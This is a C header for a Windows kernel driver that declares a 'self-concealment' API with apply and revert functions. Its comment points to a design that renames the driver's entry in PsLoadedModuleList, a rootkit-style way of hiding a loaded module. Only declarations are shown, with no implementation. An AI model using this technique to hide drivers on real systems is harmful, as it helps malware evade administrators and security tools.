/* stealth.h -- module self-concealment API.
 * Apply during successful driver init; revert during unload. See stealth.c
 * for the PsLoadedModuleList rename design and the DriverSection caveats. */
#pragma once
#include <ntddk.h>

NTSTATUS stealth_apply(PDRIVER_OBJECT drv);
NTSTATUS stealth_revert(PDRIVER_OBJECT drv);
